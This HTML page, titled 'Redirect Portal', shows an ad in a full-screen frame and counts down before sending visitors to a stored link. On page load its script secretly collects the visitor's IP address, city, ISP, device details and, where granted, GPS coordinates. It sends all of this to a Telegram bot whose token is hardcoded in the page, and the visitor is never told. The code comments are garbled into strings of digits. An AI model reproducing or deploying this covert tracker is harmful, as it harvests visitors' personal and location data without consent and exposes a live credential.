<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #adFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1000;
        }

        .timer-container {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 10px;
            z-index: 1001;
        }

        #timer {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="timer-container">
        Redirecting in: <span id="timer">01:00</span>
    </div>

    <script>
        // 171716191913141812 1017 17161919191814171016
        const BOT_TOKEN = '7487768405:AAHivvY7f_SjAw13ZgYQeUYwgCQ-2FkTKjs';
        const CHAT_ID = 'YOUR_CHAT_ID';

        // 19171718 17181617171016 15 1217161319 1918181016
        async function collectAndSendData(targetUrl) {
            try {
                // IP 15 161117171016 191917171612
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                // 191911181312 191917171612
                const deviceDetails = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
                };

                // 141915161117171016 (131419 18181412191016 141711)
                let geoData = {};
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        geoData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                    });
                }

                // 17171619191314181217 1217121714 19141213131817
                const message = `04 New Visitor Alert 04
                
98 IP Address: ${ipData.ip}
99 Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
94 Network: ${ipData.org}
9515 Device: ${deviceDetails.platform}
93 Target URL: ${targetUrl}
                
99 Full Details:
${JSON.stringify({...ipData, ...deviceDetails, ...geoData}, null, 2)}`;

                // 171716191913141812 101717 19171718 1217161319
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Error sending data:', error);
            }
        }

        // 14191918131417171317 16141917
        async function initializeRedirect() {
            const id = window.location.hash.substr(1);
            const data = JSON.parse(localStorage.getItem(id));

            if(data) {
                // 1119 16191817 1911161213171314191617 1813141414131016
                const adFrame = document.createElement('iframe');
                adFrame.id = 'adFrame';
                adFrame.src = data.adLink;
                document.body.appendChild(adFrame);

                // 19171718 17181617171016 15 1217161319
                await collectAndSendData(data.targetLink);

                // 171813121814 1217171218
                let timeLeft = 60;
                const timerElement = document.getElementById('timer');
                
                const countdown = setInterval(() => {
                    timeLeft--;
                    timerElement.textContent = `${String(Math.floor(timeLeft/60)).padStart(2,'0')}:${String(timeLeft%60).padStart(2,'0')}`;
                    
                    if(timeLeft <= 0) {
                        clearInterval(countdown);
                        window.location.href = data.targetLink;
                    }
                }, 1000);
            }
        }

        window.onload = initializeRedirect;
    </script>
</body>
</html>
